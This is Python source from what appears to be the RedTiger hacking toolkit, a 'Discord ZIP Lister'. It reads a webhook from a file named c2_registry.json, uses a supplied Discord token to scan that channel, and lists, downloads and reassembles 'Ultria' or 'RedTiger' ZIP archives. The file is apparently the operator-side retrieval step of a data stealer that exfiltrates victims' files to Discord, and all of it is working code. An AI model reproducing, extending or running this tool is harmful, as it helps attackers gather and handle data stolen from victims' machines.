# Copyright (c) RedTiger
# See the file 'LICENSE' for copying permission

from Config.Util import *
from Config.Config import *

import re
import os
import io
import json
import requests

Title("Discord ZIP Lister")

_REGISTRY_PATH = os.path.join(tool_path, "build", "c2_registry.json")
_DOWNLOAD_DIR  = os.path.expanduser("~/Downloads")

# ── Load webhook URL from registry ────────────────────────────────────────────
def _load_webhook():
    try:
        with open(_REGISTRY_PATH) as f:
            return json.load(f).get("webhook_url", "")
    except:
        return ""

# ── Get channel_id from webhook info ──────────────────────────────────────────
def _get_channel_id(wh_url):
    try:
        r = requests.get(wh_url, timeout=8)
        if r.status_code == 200:
            return str(r.json().get("channel_id", ""))
    except:
        pass
    return ""

# ── Fetch messages from channel (requires token) ──────────────────────────────
def _fetch_messages(token, channel_id, limit=100):
    """Fetches up to `limit` messages, paginating if needed (max 500)."""
    headers = {"Authorization": token, "Content-Type": "application/json"}
    msgs = []
    last_id = None
    while len(msgs) < min(limit, 500):
        batch = min(100, limit - len(msgs))
        url = f"https://discord.com/api/v9/channels/{channel_id}/messages?limit={batch}"
        if last_id:
            url += f"&before={last_id}"
        try:
            r = requests.get(url, headers=headers, timeout=10)
            if r.status_code == 429:
                wait = r.json().get("retry_after", 5)
                print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Rate limited — waiting {wait}s...")
                import time; time.sleep(wait)
                continue
            if r.status_code != 200:
                print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} API error {r.status_code}: {r.text[:200]}")
                break
            batch_msgs = r.json()
            if not batch_msgs:
                break
            msgs.extend(batch_msgs)
            last_id = batch_msgs[-1]["id"]
            if len(batch_msgs) < 100:
                break
        except Exception as e:
            print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Request failed: {e}")
            break
    return msgs

# ── Parse attachments for Ultria ZIP parts ────────────────────────────────────
# Patterns:
#   single  : Ultria_<name>.zip  (or legacy RedTiger_<name>.zip)
#   multi   : Ultria_<name>.partXofY.zip
_RE_MULTI  = re.compile(r'^(.+)\.part(\d+)of(\d+)\.zip$', re.IGNORECASE)
_RE_SINGLE = re.compile(r'^(?:Ultria_|RedTiger_)(.+)\.zip$', re.IGNORECASE)

def _parse_attachments(messages):
    """Returns dict: base_name -> {total, parts: {int -> {url, size, msg_id}}}"""
    found = {}  # base -> {total, parts}
    for msg in messages:
        for att in msg.get("attachments", []):
            name = att.get("filename", "")
            url  = att.get("url", "")
            size = att.get("size", 0)
            mid  = msg.get("id", "")

            m = _RE_MULTI.match(name)
            if m:
                base  = m.group(1)
                idx   = int(m.group(2))
                total = int(m.group(3))
                if base not in found:
                    found[base] = {"total": total, "parts": {}}
                found[base]["parts"][idx] = {"url": url, "size": size, "msg_id": mid, "filename": name}
                continue

            s = _RE_SINGLE.match(name)
            if s:
                base = s.group(1)
                if base not in found:
                    found[base] = {"total": 1, "parts": {}}
                found[base]["parts"][1] = {"url": url, "size": size, "msg_id": mid, "filename": name}

    return found

# ── Display summary ────────────────────────────────────────────────────────────
def _display(found):
    if not found:
        print(f"\n{BEFORE + current_time_hour() + AFTER} {INFO} No Ultria ZIPs found in channel.")
        return

    complete   = {k: v for k, v in found.items() if len(v["parts"]) == v["total"]}
    incomplete = {k: v for k, v in found.items() if len(v["parts"]) != v["total"]}

    print(f"\n{red}── Ultria ZIP Archives in Discord Channel {'─'*31}{white}")

    if complete:
        print(f"\n  {green}[COMPLETE — ready to download]{white}")
        for i, (base, info) in enumerate(complete.items(), 1):
            total_size = sum(p["size"] for p in info["parts"].values()) / 1024 / 1024
            n = info["total"]
            label = "single file" if n == 1 else f"{n} parts"
            print(f"  {red}[{white}{i}{red}]{white} {base}  {red}|{white} {label}  {red}|{white} ~{total_size:.1f} MB")

    if incomplete:
        print(f"\n  {yellow}[INCOMPLETE — missing parts]{white}")
        for base, info in incomplete.items():
            have  = sorted(info["parts"].keys())
            total = info["total"]
            missing = [x for x in range(1, total+1) if x not in info["parts"]]
            print(f"  {red}[!]{white} {base}  {red}|{white} have {have}/{list(range(1,total+1))}  {red}|{white} missing: {missing}")

    print(f"\n{red}{'─'*70}{white}")
    return complete

# ── Download + reassemble a full ZIP ──────────────────────────────────────────
def _download_full(base, info, dest_dir):
    out_path = os.path.join(dest_dir, base + "_FULL.zip")
    total = info["total"]
    print(f"\n{BEFORE + current_time_hour() + AFTER} {WAIT} Downloading {total} part(s) → {out_path}")

    with open(out_path, "wb") as f_out:
        for idx in range(1, total + 1):
            part = info["parts"][idx]
            fname = part["filename"]
            print(f"  {BEFORE + current_time_hour() + AFTER} {WAIT} [{idx}/{total}] {fname} ({part['size']//1024} KB)")
            try:
                r = requests.get(part["url"], timeout=60, stream=True)
                r.raise_for_status()
                for chunk in r.iter_content(65536):
                    f_out.write(chunk)
            except Exception as e:
                print(f"  {BEFORE + current_time_hour() + AFTER} {ERROR} Failed part {idx}: {e}")
                os.remove(out_path)
                return None

    size_mb = os.path.getsize(out_path) / 1024 / 1024
    print(f"{BEFORE + current_time_hour() + AFTER} {ADD} Saved: {white}{out_path}{red} ({size_mb:.1f} MB)")
    return out_path

# ── Main ──────────────────────────────────────────────────────────────────────
def main():
    Clear()
    print(virus_banner())

    wh_url = _load_webhook()
    if not wh_url:
        wh_url = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Webhook URL -> {reset}").strip()
    if not wh_url:
        ErrorWebhook(); return

    print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Getting channel ID from webhook...")
    channel_id = _get_channel_id(wh_url)
    if not channel_id:
        print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Could not get channel ID from webhook.")
        return
    print(f"{BEFORE + current_time_hour() + AFTER} {ADD} Channel ID: {white}{channel_id}")

    print(f"\n{BEFORE + current_time_hour() + AFTER} {INFO} Enter your Discord token to read the channel.")
    print(f"  {red}(Bot token: starts with 'Bot ...', user token: raw string){white}")
    token = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Token -> {reset}").strip()
    if not token:
        ErrorToken(); return

    try:
        limit = int(input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} How many messages to scan (default 200) -> {reset}").strip() or "200")
    except:
        limit = 200

    print(f"\n{BEFORE + current_time_hour() + AFTER} {WAIT} Fetching up to {limit} messages...")
    messages = _fetch_messages(token, channel_id, limit)
    if not messages:
        print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} No messages retrieved (check token/channel access).")
        return

    print(f"{BEFORE + current_time_hour() + AFTER} {ADD} {len(messages)} messages scanned.")

    found = _parse_attachments(messages)
    complete = _display(found)

    if not complete:
        Continue(); return

    print(f"\n{BEFORE + current_time_hour() + AFTER} {INPUT} Download a ZIP? Enter number (or 0 to skip) -> ", end="")
    try:
        choice = int(input(reset).strip())
    except:
        choice = 0

    if choice > 0:
        keys = list(complete.keys())
        if 1 <= choice <= len(keys):
            base = keys[choice - 1]
            dest = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Save to (default: Downloads) -> {reset}").strip()
            if not dest or not os.path.isdir(dest):
                dest = _DOWNLOAD_DIR
            _download_full(base, complete[base], dest)
        else:
            ErrorNumber()

    Continue()

main()
